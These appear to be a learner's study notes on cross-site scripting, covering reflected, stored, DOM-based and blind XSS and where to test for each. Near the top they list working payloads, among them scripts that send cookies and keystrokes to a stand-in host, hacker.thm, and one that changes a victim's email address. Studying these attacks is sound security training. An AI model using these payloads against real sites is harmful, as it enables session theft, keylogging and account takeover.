aIn short: injection of malicious javascript

### XSS Payloads

Payload: the javascript code

Examples: 

Proof of concept:
`<script>alert('XSS');</script>`: used to check if XSS is possible

Session Stealing:
`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

Key Logger:
`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

Business Logic:
`<script>user.changeEmail('attacker@hacker.thm');</script>`: call a function used in JS, here change email adress

### Reflected XSS

when user-supplied data in a HTTP request is included in the webpage source without any validation

Exemple: 

![[Pasted image 20250407183010.png]]ù

Impact: attacker can send links, embed them into an iframe on another website containing a JS payload to potential victims, getting them to execute code in their browser, revealing session or customer information

To test:

- Parameters in the URL Query String 
- URL File Path
- HTTP Headers (but unlikely)

### Stored XSS

Example:

![[Pasted image 20250407183330.png]]

Tests to make:
- Comments on a blog
- Personal User profile information
- Website Listings

Good idea: test directly the API without making requests from the browser, allows to skip form validation

### [[To sort/CYBER/DOM]] Based XSS

Exploits JS directly in the browser, without pages loaded or data submitted to backend

Example Scenario:
=> website's JS checks for window.location.hash parameter and writes that onto the page into the currently being viewed section
=> contents not checked for malicious code, can inject code there
=> allows to create malicious links to redirect them elsewhere

Test: Need to check for variables that attacker can have control of like `window.location.x`, then needs to see how they are handled and whether values are written on the DOM or passed to unsafe JS methods such as eval().

### Blind XSS

Similar to [[#Stored XSS]], as payload is stored for someone else to see, but here you can't see the payload working or to test it against yourself

Example: chat with customer support where messages are not validated that are turned into support tickets

To test:
- make sure there is a callback (ex: HTTP response)
- use XSS Hunter Express: captures cookies, URLs, page contents, ...


## Examples








